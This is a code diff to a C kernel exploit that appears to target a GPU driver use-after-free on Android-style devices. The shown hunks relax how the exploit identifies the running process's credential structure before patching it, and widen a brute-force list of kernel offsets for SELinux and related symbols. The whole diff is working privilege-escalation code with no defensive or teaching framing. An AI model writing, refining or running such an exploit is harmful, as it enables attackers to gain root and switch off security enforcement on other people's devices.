@@ -105,7 +105,7 @@ static int wait_for_flag_u8(volatile uint8_t *ptr, uint8_t value, unsigned int t
     unsigned int waited = 0;
     while (*ptr != value && waited < timeout_ms)
     {
-        if (waited % 10000 == 0 && waited > 0) {
+        if (waited % 30000 == 0 && waited > 0) {
             fprintf(stderr, "[WAIT] Still waiting for flag (0x%x), elapsed: %u ms\n", value, waited);
         }
         usleep(WAIT_STEP_US);
@@ -1220,15 +1220,13 @@ static void safe_cred_patch(void)
                     uint8_t cred_check[64];
                     if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0) {
                         uint32_t usage = *(uint32_t *)(cred_check + 0x00);
-                        uint32_t uid = *(uint32_t *)(cred_check + 0x04);
-                        uint32_t gid = *(uint32_t *)(cred_check + 0x08);
+                        uint32_t uid_at_4 = *(uint32_t *)(cred_check + 0x04);
                         
-                        fprintf(stderr, "[CHILD]   Candidate at off 0x%x: ptr=0x%lx, usage=%u, uid=%u, gid=%u\n", 
-                                off, (unsigned long)ptr, usage, uid, gid);
-
-                        if (usage > 0 && usage < 10000 && uid == my_uid) {
+                        // Flexible check: UID can be at +0 or +4
+                        if ((usage == my_uid) || (uid_at_4 == my_uid)) {
                             cred_ptr = ptr;
-                            fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx\n", (unsigned long)cred_ptr);
+                            fprintf(stderr, "[CHILD] [!!!] FOUND MATCHING CRED! ptr=0x%lx (UID found at %s)\n", 
+                                    (unsigned long)cred_ptr, (usage == my_uid) ? "+0x00" : "+0x04");
                             break;
                         }
                     } else {
@@ -1476,27 +1474,14 @@ static uint64_t find_offsets_auto(uint64_t kernel_base)
 {
     uint64_t selinux_offsets[] = {
         SELINUX_OFFSET,
-        0x2A8FCE8,
-        0x2B8FCE8,
-        0x2D8FCE8,
-        0x2E8FCE8,
-        0x2C8FCE8,
-        0x2F4FCE8,
-        0x2F5FCE8,
-        0x2F84CE8,
-        0x2F64CE8,
-        0x2F54CE8,
-        0x2F44CE8,
-        0x2F34CE8,
-        0x2F24CE8,
-        0x2F14CE8,
-        0x2F04CE8,
-        0x2EF4CE8,
-        0x3000000,
-        0x3100000,
-        0x3200000,
-        0x3F74CE8,
-        0x3F84CE8,
+        0x2A8FCE8, 0x2B8FCE8, 0x2D8FCE8, 0x2E8FCE8, 0x2C8FCE8, 0x2F4FCE8, 0x2F5FCE8,
+        0x2F84CE8, 0x2F64CE8, 0x2F54CE8, 0x2F44CE8, 0x2F34CE8, 0x2F24CE8, 0x2F14CE8,
+        0x2F04CE8, 0x2EF4CE8, 0x3000000, 0x3100000, 0x3200000, 0x3F74CE8, 0x3F84CE8,
+        0x2f74ce8, 0x2f74ce0, 0x2f74cf0, 0x2f74d00, 0x2f74d10, 0x2f74d20, 0x2f74d30,
+        0x2f74d40, 0x2f74d50, 0x2f74d60, 0x2f74d70, 0x2f74d80, 0x2f74d90, 0x2f74da0,
+        0x2f74db0, 0x2f74dc0, 0x2f74dd0, 0x2f74de0, 0x2f74df0, 0x2f74e00,
+        0x24C2538, // memstart_addr candidate
+        0x2bb8ec0  // poweroff_cmd candidate
     };
 
     for (size_t i = 0; i < sizeof(selinux_offsets) / sizeof(selinux_offsets[0]); i++)
@@ -1948,18 +1933,13 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
                                     uint8_t cc[64];
                                     if (gpu_read_task_struct(fd, p, cc, 64) == 0) {
                                         uint32_t usage = *(uint32_t *)cc;
-                                        uint32_t uid = *(uint32_t *)(cc + 4);
-                                        uint32_t gid = *(uint32_t *)(cc + 8);
+                                        uint32_t uid_at_4 = *(uint32_t *)(cc + 4);
                                         
-                                        if (p_cand < 100) { // More verbose parent search
-                                            fprintf(stderr, "      [P] Candidate off 0x%x: ptr=0x%lx, uid=%u, usage=%u\n", 
-                                                    off, (unsigned long)p, uid, usage);
-                                        }
-
-                                        if (uid == my_uid && usage > 0 && usage < 10000) {
+                                        if (usage == my_uid || uid_at_4 == my_uid) {
                                             c_ptr = p;
                                             rc_ptr = p;
-                                            fprintf(stderr, "      [P] [!!!] Parent found MATCHING CRED! ptr=0x%lx\n", (unsigned long)c_ptr);
+                                            fprintf(stderr, "      [P] [!!!] Parent found MATCHING CRED! ptr=0x%lx (UID at %s)\n", 
+                                                    (unsigned long)c_ptr, (usage == my_uid) ? "+0x00" : "+0x04");
                                             break;
                                         }
                                     }
